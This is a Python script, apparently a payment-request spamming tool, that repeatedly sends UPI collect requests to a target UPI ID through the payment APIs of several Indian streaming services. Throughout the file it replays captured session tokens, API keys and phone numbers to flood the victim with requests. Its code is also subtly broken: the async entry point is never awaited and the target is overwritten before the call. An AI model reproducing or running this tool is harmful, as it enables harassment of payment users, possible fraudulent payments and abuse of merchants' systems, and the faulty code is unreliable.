import time
import asyncio
import aiohttp
import os
num="9569322317@paytm"
async def upi(num: int):
    async def OTTplay(upid):
        try:
            data = {
                'upi_vpa': f'{upid}',
                'txn_type': 'UPI_COLLECT',
                'save_to_locker': 'true',
                'redirect_after_payment': 'true',
                'payment_method_type': 'UPI',
                'payment_method': 'UPI',
                'payment_channel': 'WEB',
                'order_id': 'HTELC4LC1691243952034',
                'metadata': '{"pp_mode":"RELEASE","payment_channel":"WEB","microapp":"hyperpay"}',
                'merchant_id': 'htott',
                'format': 'json',
                'additional_payment_details': '[]',
                'add_merchant_return_url': 'true',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://public.releases.juspay.in/wapi/txns', data=data) as response:
                    print(response.json)
        except Exception as e:
            print(e)


    async def hotstar1(upid):
        try:
            headers = {
                'authority': 'www.hotstar.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': f'{upid}',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9554929436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    print(response.json)
        except Exception as e:
            print(e)
                    
    async def kanchalanka(upid):
        try:
            headers = {
                'authority': 'prod-api.viewlift.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIzZTczNTlkNy1mYmZkLTRhMDgtYjliNy0xNmNhZTJkZmQ3MjMiLCJzaXRlIjoicGFyaWphIiwic2l0ZUlkIjoiZmYxNjRlMTAtYWMzOC0xMWViLTk1MGItZGJlZjFlMzRjMTlhIiwiaXBhZGRyZXNzZXMiOiIxMDMuMTgwLjk0LjE4NCwgMTAuMTIwLjQxLjMwLCAzNS4xNzQuMTI5Ljc3LCAxMzAuMTc2Ljk4LjkyIiwiZW1haWwiOiIrOTE5NTU0OTI5NDM2QHBhcmlqYS5jb20iLCJjb3VudHJ5Q29kZSI6IklOIiwicG9zdGFsY29kZSI6IjExMDAwNSIsInByb3ZpZGVyIjoidmlld2xpZnQiLCJsb2dpblZpYSI6IlBIT05FIiwiZGV2aWNlSWQiOiJicm93c2VyLTk4MjllNzFhLTdkMDUtZWQwNS03MTUwLTQ3YmM0MGZlMDc4OSIsImlhdCI6MTY5MTIyNTYxOSwiZXhwIjoxNjkxODMwNDE5fQ.VtQbLcfoOkf5vlrYXIj9G4Y7jVac22BgnBE1iMStJ8s',
                'content-type': 'application/json',
                'origin': 'https://www.kancchalannka.com',
                'referer': 'https://www.kancchalannka.com/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
            }

            json_data = {
                'payment_method_type': 'UPI',
                'payment_method': 'UPI',
                'txn_type': 'UPI_COLLECT',
                'upi_vpa': f'{upid}',
                'redirect_after_payment': 'true',
                'format': 'json',
                'order_id': 'lUlUEX327zn16F',
                'merchant_id': 'kancchalannka',
                'mobile_number': '+919556529436',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://prod-api.viewlift.com/subscription/payment', headers=headers, json=json_data) as response:
                    print(response.json)
        except Exception as e:
            print(e)

    async def hindustanmedia(upid):
        try:
            data = {
            'upi_vpa': f'{upid}',
            'txn_type': 'UPI_COLLECT',
            'save_to_locker': 'true',
            'redirect_after_payment': 'true',
            'payment_method_type': 'UPI',
            'payment_method': 'UPI',
            'payment_channel': 'WEB',
            'order_id': 'HTVTEHNY1691219098814',
            'metadata': '{"pp_mode":"RELEASE","payment_channel":"WEB","microapp":"hyperpay"}',
            'merchant_id': 'htott',
            'format': 'json',
            'additional_payment_details': '[]',
            'add_merchant_return_url': 'true',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://public.releases.juspay.in/wapi/txns', data=data) as response:
                    print(response.json)

        except Exception as e:
            print(e)

    async def hindustanmedia2(upid):
        try:
            headers = {
            'authority': 'public.releases.juspay.in',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://public.releases.juspay.in',
            'sdk-app-name': 'unknown_appname',
            'sdk-client-id': 'htott',
            'sdk-godel-build-version': 'unknown_build',
            'sdk-godel-version': '3.7.3',
            'sdk-is-saved-vpa': 'false',
            'sdk-os': 'WEB',
            'sdk-ppflow': 'paymentpage',
            'sdk-redirection-flow': 'true',
            'sdk-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'sdk-version-ec': '3.3.3',
            'sdk-version-flyer': '2.5.2',
            'sdk-version-hyperos': '1.0.0-hyper-core-web.20',
            'sdk-version-hyperos-config': '52658646634463423',
            'sdk-version-hyperos-tracker': '2.0.44',
            'sdk-version-hyperpay': '3.30.1-release-20230622.4',
            'sdk-version-hyperpay-config': '2.27',
            'sdk-version-hyperpay-icons': '2.27',
            'sdk-version-hyperpay-strings': '2.27',
            'sdk-version-upiintent': '4.0.1',
            'sdk-version-upiintent-config': '2.0.93',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'x-jp-merchant-id': 'htott',
            'x-merchantid': 'htott',
            'x-session-id': 'fd6facc3-e2af-4c69-b49d-d32f359d4804',
            }

            data = f'upi_vpa={upid}&txn_type=UPI_COLLECT&save_to_locker=true&redirect_after_payment=true&payment_method_type=UPI&payment_method=UPI&payment_channel=WEB&order_id=HTBNM4LP1691218921418&metadata=%7B%22pp_mode%22%3A%22RELEASE%22%2C%22payment_channel%22%3A%22WEB%22%2C%22microapp%22%3A%22hyperpay%22%7D&merchant_id=htott&format=json&additional_payment_details=%5B%5D&add_merchant_return_url=true'
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://public.releases.juspay.in/wapi/txns', headers=headers, data=data) as response:
                    print(response.json)
        except Exception as e:
            print(e)
        

    async def hoichoi(upid):
            try:
                headers = {
                'authority': 'prod-api.viewlift.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0Mjg3OTFhMy1iNjU2LTRmMjgtYTk5ZC05YzNjODljNjQyYzciLCJzaXRlIjoiaG9pY2hvaXR2Iiwic2l0ZUlkIjoiN2ZhMGVhOWEtOTc5OS00NDE3LTk5ZjUtY2JiNTM0M2M1NTFkIiwiZW1haWwiOiIrOTE4MDA0MzYwODMyQGhvaWNob2l0di5jb20iLCJpcGFkZHJlc3NlcyI6IjEwMy4xODAuOTQuMTU0LCAxMC4xMjAuMy4wLCA1NC4yMjQuMjA5LjE2LCAxMzAuMTc2Ljk4LjE1OCIsImNvdW50cnlDb2RlIjoiSU4iLCJwb3N0YWxjb2RlIjoiMTEwMDAxIiwicHJvdmlkZXIiOiJ2aWV3bGlmdCIsImRldmljZUlkIjoiYnJvd3Nlci0yODVjNmM4ZC0yYTJjLTkxZDEtMmRlMS1hYjY3Y2Q2ZjJmODUiLCJpZCI6IjQyODc5MWEzLWI2NTYtNGYyOC1hOTlkLTljM2M4OWM2NDJjNyIsInBob25lTnVtYmVyIjoiKzkxODAwNDM2MDgzMiIsInBob25lQ29kZSI6OTEsImxvZ2luVmlhIjoiUEhPTkUiLCJpYXQiOjE2OTEyMTUxNzAsImV4cCI6MTY5MTgxOTk3MH0.oMkBeyTZXbfNAxK5WJmGnJitjOmCRC3gLTGgTvAhFmw',
                'content-type': 'application/json',
                'origin': 'https://www.hoichoi.tv',
                'referer': 'https://www.hoichoi.tv/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
                }

                json_data = {
                'payment_method_type': 'UPI',
                'payment_method': 'UPI',
                'txn_type': 'UPI_COLLECT',
                'upi_vpa': f'{upid}',
                'redirect_after_payment': 'true',
                'format': 'json',
                'order_id': 'WXqEBaq6Blaz6U',
                'merchant_id': 'hoichoi',
                'mobile_number': '+918638360832',
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post('https://prod-api.viewlift.com/subscription/payment', headers=headers, json=json_data) as response:
                        print(response.json)
            except Exception as e:
                print(e)

    async def main(upid):
        for i in range(5):
            await asyncio.gather(
                OTTplay(upid),
                hotstar1(upid),
                kanchalanka(upid),
                hindustanmedia(upid),
                hindustanmedia2(upid),
                hoichoi(upid)

            )
        

    asyncio.run(main(num))


num="€tor"
start = time.time()
upi(num)
end = time.time()
f = open("k.txt", "w")
f.write(str(end-start))
f.close()        

